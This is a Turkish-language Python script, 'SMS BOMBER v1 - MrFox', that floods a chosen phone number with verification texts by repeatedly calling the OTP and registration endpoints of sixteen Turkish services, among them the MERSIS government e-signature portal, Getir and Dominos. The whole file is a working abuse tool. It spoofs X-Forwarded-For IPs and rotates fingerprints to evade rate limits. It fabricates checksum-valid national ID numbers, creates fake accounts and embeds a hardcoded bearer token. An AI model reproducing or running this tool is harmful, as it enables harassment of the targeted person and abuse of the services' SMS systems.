#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import hashlib
import base64
import uuid
import socket
import threading
import queue
import argparse
from datetime import datetime
from urllib.parse import urlencode

try:
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[!] Gerekli paketler yok. pip install requests colorama")
    sys.exit(1)

GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
WHITE = Fore.WHITE
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

BANNER = f"""
{CYAN}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║           {RED}███████╗███╗   ███╗███████╗██████╗                      {CYAN}║
║           {RED}██╔════╝████╗ ████║██╔════╝██╔══██╗                     {CYAN}║
║           {RED}███████╗██╔████╔██║███████╗██████╔╝                     {CYAN}║
║           {RED}╚════██║██║╚██╔╝██║╚════██║██╔══██╗                     {CYAN}║
║           {RED}███████║██║ ╚═╝ ██║███████║██████╔╝                     {CYAN}║
║           {RED}╚══════╝╚═╝     ╚═╝╚══════╝╚═════╝                      {CYAN}║
║                                                                   ║
║              {WHITE}SMS BOMBER v1 - MrFox{RESET}                                {CYAN}║
║                                                                   {CYAN}║
╚═══════════════════════════════════════════════════════════════════╝{RESET}
"""

class DigitalIdentity:
    def __init__(self):
        self._generate_identity()
    
    def _generate_identity(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        self.user_agent = random.choice(user_agents)
        self.device_id = str(uuid.uuid4())
        self.session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
        self.fingerprint = hashlib.sha256(f"{self.user_agent}{self.device_id}{time.time()}".encode()).hexdigest()
        self.ip = f"{random.randint(85,95)}.{random.randint(100,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def get_headers(self, extra=None):
        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Forwarded-For': self.ip,
            'X-Device-Id': self.device_id,
            'X-Session-Id': self.session_id,
            'X-Fingerprint': self.fingerprint[:16],
            'Dnt': '1',
            'Sec-Gpc': '1',
            'Connection': 'keep-alive'
        }
        if extra:
            headers.update(extra)
        return headers

class SMSProvider:
    def __init__(self, name, api_url, method='POST', headers=None, payload=None, check_func=None, is_form=False):
        self.name = name
        self.api_url = api_url
        self.method = method
        self.headers = headers or {}
        self.payload = payload or {}
        self.check_func = check_func or self._default_check
        self.is_form = is_form
    
    def _default_check(self, response):
        return response.status_code == 200
    
    def _generate_tc(self):
        digits = [random.randint(1, 9)] + [random.randint(0, 9) for _ in range(8)]
        odd_sum = sum(digits[0::2])
        even_sum = sum(digits[1::2])
        digits.append(((odd_sum * 7) - even_sum) % 10)
        digits.append(sum(digits[:10]) % 10)
        return ''.join(map(str, digits))
    
    def _generate_data_to_sign(self):
        now = datetime.now().strftime('%d.%m.%Y %H:%M')
        text = f"{now}\nElektronik imza ile giris yaptiktan sonra MERSİS sisteminde yapacaginiz islemler, islak imza ile yapilan islemlerle ayni hukuki sonucu dogurmaktadir."
        return base64.b64encode(text.encode('utf-8')).decode('utf-8')
    
    def send(self, phone):
        try:
            data = {}
            for k, v in self.payload.items():
                if isinstance(v, str):
                    v = v.replace('{phone}', phone)
                    v = v.replace('{tc}', self._generate_tc())
                    v = v.replace('{dataToSign}', self._generate_data_to_sign())
                    v = v.replace('{timestamp}', str(int(time.time() * 1000)))
                    v = v.replace('{random}', ''.join(random.choices(string.digits, k=6)))
                data[k] = v
            
            if self.method == 'GET':
                response = requests.get(self.api_url, params=data, headers=self.headers, timeout=10)
            else:
                if self.is_form:
                    response = requests.post(self.api_url, data=data, headers=self.headers, timeout=10)
                else:
                    response = requests.post(self.api_url, json=data, headers=self.headers, timeout=10)
            
            success = self.check_func(response)
            return {'success': success, 'provider': self.name, 'status': response.status_code}
        except Exception as e:
            return {'success': False, 'provider': self.name, 'error': str(e)}

def get_all_providers():
    providers = []
    
    providers.append(SMSProvider(
        name='MersisMobil',
        api_url='https://mersis.ticaret.gov.tr/Portal/KullaniciIslemleri/MobileSignatureInitialization',
        method='POST',
        headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'},
        payload={'operatorType': '2', 'phoneNumber': '{phone}', 'dataToSign': '{dataToSign}', 'tcKimlikNo': '{tc}'},
        is_form=True
    ))
    
    providers.append(SMSProvider(
        name='MersisTurkTelekom',
        api_url='https://mersis.ticaret.gov.tr/Portal/KullaniciIslemleri/MobileSignatureInitialization',
        method='POST',
        headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'},
        payload={'operatorType': '3', 'phoneNumber': '{phone}', 'dataToSign': '{dataToSign}', 'tcKimlikNo': '{tc}'},
        is_form=True
    ))
    
    providers.append(SMSProvider(
        name='MersisTurkcell',
        api_url='https://mersis.ticaret.gov.tr/Portal/KullaniciIslemleri/MobileSignatureInitialization',
        method='POST',
        headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'},
        payload={'operatorType': '4', 'phoneNumber': '{phone}', 'dataToSign': '{dataToSign}', 'tcKimlikNo': '{tc}'},
        is_form=True
    ))
    
    providers.append(SMSProvider(
        name='SokMarket',
        api_url='https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate',
        method='POST',
        headers={'Content-Type': 'application/json', 'x-app-version': 'v1', 'x-platform': 'WEB'},
        payload={'clientId': 'buyer-web', 'phoneNumber': '{phone}', 'captchaToken': '', 'captchaAction': 'generate_register_otp', 'reCaptchaV2': False}
    ))
    
    providers.append(SMSProvider(
        name='Getir',
        api_url='https://food-client-api-gateway.getirapi.com/clients/by-gsm/',
        method='GET',
        headers={'Content-Type': 'application/json', 'language': 'tr'},
        payload={'countryCode': '90', 'gsm': '{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='GetirYemek',
        api_url='https://food-client-api-gateway.getirapi.com/clients/by-gsm/',
        method='GET',
        headers={'Content-Type': 'application/json', 'language': 'tr'},
        payload={'countryCode': '90', 'gsm': '{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='GetirBuyuk',
        api_url='https://food-client-api-gateway.getirapi.com/clients/by-gsm/',
        method='GET',
        headers={'Content-Type': 'application/json', 'language': 'tr'},
        payload={'countryCode': '90', 'gsm': '{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='KahveDunyasi',
        api_url='https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',
        method='POST',
        headers={'Content-Type': 'application/json', 'X-Language-Id': 'tr-TR'},
        payload={'countryCode': '90', 'phoneNumber': '{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='Bim',
        api_url='https://bim.veesk.net/service/v1.0/account/login',
        method='POST',
        headers={'Content-Type': 'application/json'},
        payload={'phone': '{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='EnglishHome',
        api_url='https://www.englishhome.com/api/member/sendOtp',
        method='POST',
        headers={'Content-Type': 'application/json'},
        payload={'Phone': '{phone}', 'XID': ''}
    ))
    
    providers.append(SMSProvider(
        name='FileMarket',
        api_url='https://api.filemarket.com.tr/v1/otp/send',
        method='POST',
        headers={'Content-Type': 'application/json', 'X-Os': 'IOS', 'X-Version': '1.7'},
        payload={'mobilePhoneNumber': '90{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='Metro',
        api_url='https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend',
        method='POST',
        headers={'Content-Type': 'application/json', 'Applicationversion': '2.4.1', 'Applicationplatform': '2'},
        payload={'methodType': '2', 'mobilePhoneNumber': '{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='Koton',
        api_url='https://www.koton.com/users/register/',
        method='POST',
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        payload={'first_name': 'Memati', 'last_name': 'Bas', 'email': '{random}@gmail.com', 'password': '31ABC..abc31', 'phone': '0{phone}', 'confirm': 'true', 'sms_allowed': 'true', 'email_allowed': 'true', 'date_of_birth': '1993-07-02', 'call_allowed': 'true', 'gender': ''}
    ))
    
    providers.append(SMSProvider(
        name='Dominos',
        api_url='https://frontend.dominos.com.tr/api/customer/sendOtpCode',
        method='POST',
        headers={'Content-Type': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg'},
        payload={'email': '{random}@gmail.com', 'isSure': False, 'mobilePhone': '{phone}'}
    ))
    
    providers.append(SMSProvider(
        name='LittleCaesars',
        api_url='https://api.littlecaesars.com.tr/api/web/Member/Register',
        method='POST',
        headers={'Content-Type': 'application/json', 'X-Platform': 'ios', 'X-Version': '1.0.0'},
        payload={'CampaignInform': True, 'Email': '{random}@gmail.com', 'InfoRegister': True, 'IsLoyaltyApproved': True, 'NameSurname': 'Memati Bas', 'Password': '31ABC..abc31', 'Phone': '{phone}', 'SmsInform': True}
    ))
    
    providers.append(SMSProvider(
        name='Money',
        api_url='https://www.money.com.tr/Account/ValidateAndSendOTP',
        method='POST',
        headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'},
        payload={'phone': '{phone}', 'GRecaptchaResponse': ''}
    ))
    
    return providers

class SMSBomber:
    def __init__(self, phone, duration, interval, use_tor=False, quiet=False):
        self.phone = phone
        self.duration = duration
        self.interval = interval
        self.use_tor = use_tor
        self.quiet = quiet
        self.providers = []
        self.running = False
        self.success = 0
        self.fail = 0
        self.total = 0
        self.results = []
        self.identity = DigitalIdentity()
        self.result_queue = queue.Queue()
    
    def load_providers(self):
        self.providers = get_all_providers()
        return len(self.providers)
    
    def send_worker(self, provider, phone):
        identity = DigitalIdentity()
        provider.headers.update(identity.get_headers())
        result = provider.send(phone)
        result['fingerprint'] = identity.fingerprint[:12]
        self.result_queue.put(result)
    
    def run(self):
        self.running = True
        start_time = time.time()
        
        if not self.quiet:
            print(f"{CYAN}▶ SMS BOMBA BAŞLATILDI!{RESET}")
            print(f"{CYAN}{'='*50}{RESET}\n")
        
        while self.running and (time.time() - start_time) < self.duration:
            threads = []
            for provider in self.providers:
                t = threading.Thread(target=self.send_worker, args=(provider, self.phone))
                t.daemon = True
                threads.append(t)
                t.start()
            
            for t in threads:
                t.join(timeout=5)
            
            while not self.result_queue.empty():
                result = self.result_queue.get()
                self.total += 1
                if result['success']:
                    self.success += 1
                    if not self.quiet:
                        fp = result.get('fingerprint', '')
                        print(f"{GREEN}[+] BAŞARILI{RESET} ({result['provider']}) 🔑{fp}")
                else:
                    self.fail += 1
                    if not self.quiet:
                        print(f"{RED}[-] BAŞARISIZ{RESET} ({result['provider']})")
                self.results.append(result)
            
            if self.running and random.random() > 0.5:
                self.identity = DigitalIdentity()
            
            if self.running and (time.time() - start_time) < self.duration:
                time.sleep(self.interval)
        
        self.running = False
        if not self.quiet:
            print(f"\n{CYAN}{'='*50}{RESET}")
            print(f"{WHITE}⏹ SMS BOMBA DURDURULDU{RESET}")
        
        return {
            'total': self.total,
            'success': self.success,
            'fail': self.fail,
            'rate': self.success / (self.total or 1) * 100
        }

def main():
    parser = argparse.ArgumentParser(description='SMS Bomber PC - MrFox')
    parser.add_argument('-n', '--number', help='Telefon numarası (10 haneli)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Süre (saniye)')
    parser.add_argument('-i', '--interval', type=float, default=2.0, help='Aralık (saniye)')
    parser.add_argument('-t', '--tor', action='store_true', help='Tor proxy kullan')
    parser.add_argument('-q', '--quiet', action='store_true', help='Sessiz mod')
    args = parser.parse_args()
    
    print(BANNER)
    
    phone = args.number
    if not phone:
        phone = input(f"{YELLOW}[?] Telefon numarası (10 haneli): {RESET}").strip()
    
    phone = ''.join(filter(str.isdigit, phone))
    if len(phone) < 10:
        print(f"{RED}[!] Geçersiz numara{RESET}")
        sys.exit(1)
    phone = phone[-10:]
    
    duration = args.duration
    interval = args.interval
    
    print(f"{MAGENTA}📱 Numara: {phone}{RESET}")
    print(f"{MAGENTA}⏱ Süre: {duration}s | Aralık: {interval}s{RESET}")
    print(f"{MAGENTA}🔐 Tor: {'AKTIF' if args.tor else 'PASIF'}{RESET}")
    print()
    
    bomber = SMSBomber(phone, duration, interval, args.tor, args.quiet)
    
    provider_count = bomber.load_providers()
    print(f"{GREEN}[+] {provider_count} provider yüklendi.{RESET}")
    
    if not args.quiet:
        confirm = input(f"{YELLOW}[?] Başlatsın mı? (e/h): {RESET}").strip().lower()
        if confirm not in ['e', 'evet']:
            print(f"{RED}[!] İptal.{RESET}")
            return
    
    result = bomber.run()
    
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{WHITE}📊 DURUM RAPORU{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    print(f"{WHITE}  Toplam      : {CYAN}{result['total']}{RESET}")
    print(f"{WHITE}  {GREEN}✅ Başarılı : {GREEN}{result['success']}{RESET}")
    print(f"{WHITE}  {RED}❌ Başarısız : {RED}{result['fail']}{RESET}")
    print(f"{WHITE}  Başarı Oranı: {YELLOW}{result['rate']:.1f}%{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Çıkış.{RESET}")
        sys.exit(0)